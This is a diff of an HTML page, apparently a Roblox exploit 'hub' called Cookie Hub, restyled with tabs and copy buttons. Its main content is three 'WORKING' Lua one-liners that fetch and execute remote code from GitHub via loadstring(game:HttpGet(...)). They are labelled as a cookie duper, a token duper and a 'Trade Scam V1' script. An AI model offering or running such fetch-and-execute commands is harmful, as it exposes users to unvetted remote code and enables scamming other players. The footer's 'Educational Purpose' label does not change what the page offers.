@@ -1,203 +1,199 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Cookie Brainrot Duper</title>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Cookie Hub</title>
 
 <style>
+/* RESET */
 * {
+  box-sizing: border-box;
   margin: 0;
   padding: 0;
-  box-sizing: border-box;
-  font-family: "Segoe UI", sans-serif;
+  font-family: 'Segoe UI', system-ui, sans-serif;
 }
 
-body {
-  height: 100vh;
-  color: white;
-  overflow: hidden;
+html, body {
+  height: 100%;
+  overflow-x: hidden;
 }
 
-/* 🌌 Galaxy Video */
+/* GALAXY VIDEO BACKGROUND */
 .bg-video {
   position: fixed;
-  inset: 0;
-  width: 110%;
-  height: 110%;
+  top: 0;
+  left: 0;
+  width: 100vw;
+  height: 100vh;
   object-fit: cover;
   z-index: -3;
-  transition: transform 0.2s ease-out;
 }
 
-/* Dark blur overlay */
-.overlay {
+.bg-overlay {
   position: fixed;
   inset: 0;
-  background: rgba(0,0,0,0.6);
-  backdrop-filter: blur(6px);
+  background: radial-gradient(circle at top, rgba(120,60,255,0.25), rgba(5,5,20,0.85));
   z-index: -2;
 }
 
-/* Main layout */
+/* MAIN CONTAINER (OLD UI SAFE) */
 .container {
-  max-width: 900px;
-  margin: auto;
-  padding: 20px;
-  margin-top: 40px;
+  max-width: 420px;
+  margin: 40px auto;
+  padding: 18px;
 }
 
-/* Header */
+/* HEADER */
 .header {
   text-align: center;
-  margin-bottom: 30px;
+  margin-bottom: 20px;
 }
 
 .header h1 {
-  font-size: 2.5rem;
-  text-shadow: 0 0 25px #9b6cff;
+  color: #fff;
+  font-size: 28px;
 }
 
 .active-users {
-  margin-top: 8px;
-  color: #cdbbff;
+  margin-top: 6px;
+  color: #b9a9ff;
+  font-size: 14px;
 }
 
-/* Script cards */
-.card {
+/* TABS (OLD STYLE) */
+.tabs {
+  display: flex;
+  gap: 10px;
+  margin: 20px 0;
+}
+
+.tab {
+  flex: 1;
+  padding: 12px;
   background: rgba(255,255,255,0.08);
-  border-radius: 16px;
-  padding: 20px;
-  margin-bottom: 22px;
-  border: 1px solid rgba(255,255,255,0.15);
-  transition: all 0.3s ease;
+  border-radius: 14px;
+  color: #fff;
+  text-align: center;
   cursor: pointer;
-  position: relative;
-  overflow: hidden;
 }
 
-/* ✨ Glow hover */
-.card:hover {
-  transform: translateY(-4px) scale(1.01);
-  box-shadow:
-    0 0 20px rgba(155,108,255,0.6),
-    0 0 40px rgba(155,108,255,0.4);
+.tab.active {
+  background: linear-gradient(135deg, #9d6bff, #c18cff);
 }
 
-/* Glow edge animation */
-.card::before {
-  content: "";
-  position: absolute;
-  inset: -1px;
-  border-radius: 16px;
-  background: linear-gradient(120deg, transparent, rgba(155,108,255,0.8), transparent);
-  opacity: 0;
-  transition: opacity 0.3s;
-}
-
-.card:hover::before {
-  opacity: 1;
+/* SCRIPT CARD */
+.card {
+  background: rgba(20,20,40,0.9);
+  border-radius: 18px;
+  padding: 16px;
+  margin-bottom: 18px;
+  color: #fff;
 }
 
 .status {
   display: inline-block;
-  padding: 4px 12px;
-  border-radius: 10px;
-  font-size: 0.75rem;
+  background: #2aff9a;
+  color: #00331f;
+  padding: 4px 10px;
+  border-radius: 999px;
+  font-size: 12px;
+  margin-bottom: 8px;
+}
+
+.card h2 {
+  font-size: 18px;
   margin-bottom: 10px;
-  background: #00ffae;
-  color: #000;
 }
 
 .code {
-  background: #0b0b14;
+  background: #0b0b16;
   border-radius: 12px;
-  padding: 14px;
+  padding: 12px;
   font-family: monospace;
-  font-size: 0.85rem;
+  font-size: 13px;
   overflow-x: auto;
-  margin-top: 10px;
+}
+
+.copy-btn {
+  margin-top: 12px;
+  width: 100%;
+  padding: 14px;
+  border: none;
+  border-radius: 14px;
+  background: linear-gradient(135deg, #9d6bff, #c18cff);
+  color: #fff;
+  font-size: 16px;
+  cursor: pointer;
 }
 
 .footer {
   text-align: center;
-  opacity: 0.6;
+  color: #aaa;
+  font-size: 12px;
   margin-top: 30px;
-  font-size: 0.8rem;
 }
 </style>
 </head>
 
 <body>
 
-<!-- 🌌 Galaxy background -->
+<!-- GALAXY VIDEO -->
 <video class="bg-video" autoplay muted loop playsinline>
-  <source src="https://cdn.pixabay.com/video/2020/09/07/49190-458214578_large.mp4" type="video/mp4">
+  <source src="https://cdn.pixabay.com/video/2020/08/10/46070-449423591_large.mp4" type="video/mp4">
 </video>
-
-<div class="overlay"></div>
-
-<!-- 🔊 Click sound -->
-<audio id="clickSound" preload="auto">
-  <source src="https://assets.mixkit.co/sfx/preview/mixkit-sci-fi-click-900.mp3" type="audio/mpeg">
-</audio>
+<div class="bg-overlay"></div>
 
 <div class="container">
 
+  <!-- HEADER -->
   <div class="header">
-    <h1>🍪 Cookie Brainrot Duper</h1>
+    <h1>🍪 Cookie Hub</h1>
     <div class="active-users">🟢 Active Users: 189</div>
   </div>
 
+  <!-- TABS -->
+  <div class="tabs">
+    <div class="tab">Trade Scam V1</div>
+    <div class="tab">Token Duper</div>
+    <div class="tab active">Brainrot Duper</div>
+  </div>
+
+  <!-- SCRIPT 1 -->
   <div class="card">
-    <span class="status">WORKING</span>
-    <h2>Cookie Scripts Duper 🍪</h2>
+    <div class="status">WORKING</div>
+    <h2>Cookie Scripts Duper (ETFB) 🍪</h2>
     <div class="code">
 loadstring(game:HttpGet("https://raw.githubusercontent.com/luacoder312/Cookiescriptsduper/refs/heads/main/cookiescripts.lua"))()
     </div>
+    <button class="copy-btn">📋 Copy Script</button>
   </div>
 
+  <!-- SCRIPT 2 -->
   <div class="card">
-    <span class="status">WORKING</span>
+    <div class="status">WORKING</div>
     <h2>Cookie Script Token Duper 🍪</h2>
     <div class="code">
 loadstring(game:HttpGet("https://raw.githubusercontent.com/luacoder312/Tokenduper/refs/heads/main/Cookiescripts.lua"))()
     </div>
+    <button class="copy-btn">📋 Copy Script</button>
   </div>
 
+  <!-- SCRIPT 3 -->
   <div class="card">
-    <span class="status">WORKING</span>
-    <h2>Cookie Trade Scam Script 🍪</h2>
+    <div class="status">WORKING</div>
+    <h2>Cookie Trade Scam V1 🍪</h2>
     <div class="code">
 loadstring(game:HttpGet("https://raw.githubusercontent.com/luacoder312/TradescamV1/refs/heads/main/cookiescripts.lua"))()
     </div>
+    <button class="copy-btn">📋 Copy Script</button>
   </div>
 
   <div class="footer">
-    © Cookie Hub • Galaxy UI • Brainrot Edition
+    © Cookie Hub · Educational Purpose
   </div>
 
 </div>
-
-<script>
-/* 🌠 Galaxy parallax */
-const video = document.querySelector(".bg-video");
-
-document.addEventListener("mousemove", e => {
-  const x = (e.clientX / window.innerWidth - 0.5) * 10;
-  const y = (e.clientY / window.innerHeight - 0.5) * 10;
-  video.style.transform = `translate(${x}px, ${y}px) scale(1.05)`;
-});
-
-/* 🔊 Click sound */
-const sound = document.getElementById("clickSound");
-document.querySelectorAll(".card").forEach(card => {
-  card.addEventListener("click", () => {
-    sound.currentTime = 0;
-    sound.play();
-  });
-});
-</script>
 
 </body>
 </html>
